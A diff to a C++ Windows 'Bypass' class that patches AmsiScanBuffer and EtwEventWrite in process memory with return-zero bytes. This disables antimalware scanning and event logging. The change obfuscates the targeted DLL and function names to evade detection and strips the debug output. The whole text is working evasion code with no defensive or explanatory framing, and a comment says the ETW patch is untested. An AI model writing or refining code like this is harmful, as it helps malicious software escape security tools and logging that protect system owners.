@@ -1,5 +1,7 @@
 #include "Bypass.h"
 
+#include "Obfus.h"
+
 void Bypass::WriteMem(FARPROC addr, Patch patch) {
 	HANDLE currentProcessHandle = GetCurrentProcess();
 	SIZE_T rBytes;
@@ -8,22 +10,19 @@ void Bypass::WriteMem(FARPROC addr, Patch patch) {
 }
 
 bool Bypass::PatchAMSI() {
-	FARPROC addr = GetAddr("amsi.dll", "AmsiScanBuffer");
+	FARPROC addr = GetAddr(std::string(AY_OBFUSCATE("amsi.dll")), std::string(AY_OBFUSCATE("AmsiScanBuffer")));
 	Patch amsi;
-
-	std::cout << "AmsiScanBuffer Address: " << addr << std::endl;
 
 	amsi.size = 4;// x64
 	amsi.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };// x64
 		
 	WriteMem(addr, amsi);
+	return true;
 }
 
 bool Bypass::PatchETW() {// test this.
-	FARPROC addr = GetAddr("ntdll.dll", "EtwEventWrite");
+	FARPROC addr = GetAddr(std::string(AY_OBFUSCATE("ntdll.dll")), std::string(AY_OBFUSCATE("EtwEventWrite")));
 	Patch ETW;
-
-	std::cout << "EtwEventWrite Address: " << addr << std::endl;
 
 	// @TODO actaully test that this patch works, currently it's just an assumption.
 
@@ -31,6 +30,7 @@ bool Bypass::PatchETW() {// test this.
 	ETW.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };// x64
 
 	WriteMem(addr, ETW);
+	return true;
 }
 
 FARPROC Bypass::GetAddr(std::string dllName, std::string fName){
